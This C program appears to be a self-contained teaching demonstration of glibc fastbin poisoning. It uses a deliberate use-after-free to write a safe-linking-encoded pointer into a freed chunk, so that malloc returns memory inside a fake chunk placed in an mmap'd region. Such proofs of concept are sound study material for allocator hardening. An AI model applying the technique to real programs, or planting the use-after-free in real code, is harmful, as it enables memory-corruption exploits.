#include<stdio.h>
#include<sys/mman.h>
#include<stdlib.h>

void break_point() {
}
void dump_chunk(size_t* chunk) {
	printf("-- dumping: %p --\n", chunk);
	printf(" + prev_size  : 0x%lx\n", chunk[-2]);
	printf(" + chunk_size : 0x%lx\n", chunk[-1]);
	printf(" + forward    : %p\n", (void*)(chunk[0] ^ ((size_t)(&chunk[0]) >> 12)));
	if(chunk[1] == 0) {
		printf(" + backward   : %p\n", (void*)(chunk[1]));
	} else { 
		printf(" + backward   : %p --> %lx\n", (void*)(chunk[1]), *(size_t*)(chunk[1]));
	}
	puts("-----------------");

	//printf("fd_nextsize: %p\n", (void*)(chunk[2] ^ ((size_t)(&chunk[2]) >> 12)));
	//printf("bk_nextsize: %p\n", (void*)(chunk[3] ^ ((size_t)(&chunk[3]) >> 12)));
}
typedef struct malloc_chunk {
	size_t prev_size;
	size_t size;
	struct malloc_chunk *fd;
	struct malloc_chunk *bk;
} malloc_chunk;

void init_chunk(malloc_chunk *dst, size_t prev_size, size_t size, void* fd, void* bk) {
	dst->prev_size = prev_size;
	dst->size = size;
	dst->fd = (malloc_chunk*)((size_t)fd ^ ((size_t)&dst->fd >> 12));
	dst->bk = (malloc_chunk*)((size_t)bk ^ ((size_t)&dst->bk >> 12));
}

void* tcaches[7];

void allocate_to_tcache() {
	for(int i = 0;i < 7;i++) {
		tcaches[i] = malloc(0x30);
		// printf("malloc tcache: %p\n", tcaches[i]);
	}
}
void free_tcache() {
	for(int i = 0;i < 7;i++) {
		// printf("free tcache: %p\n", tcaches[i]);
		free(tcaches[i]);
	}
}

int main() {
	size_t* fake_heap = mmap((void*)0x300000000000, 0x10000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	printf("create fake chunk map at %p\n", fake_heap);
	malloc_chunk *fake_chunk = (malloc_chunk*)&fake_heap[10];
	init_chunk(fake_chunk, 0, 0x41, 0, 0);

	allocate_to_tcache();
	size_t* fastbin_ptr = malloc(0x30);

	printf("got 0x30 heap area: %p\n", fastbin_ptr);

	free_tcache(); // fill tcache
	free(fastbin_ptr);

	fastbin_ptr[0] = (size_t)fake_chunk ^ ((size_t)&fastbin_ptr[0] >> 12); //  UAF

	allocate_to_tcache(); // remote tcache

	size_t* pointer = malloc(0x30); // get from fastbin

	size_t* fake_heap_pointer = malloc(0x30); // NOT check dest size.
	printf("got pointer %p\n", fake_heap_pointer);
}
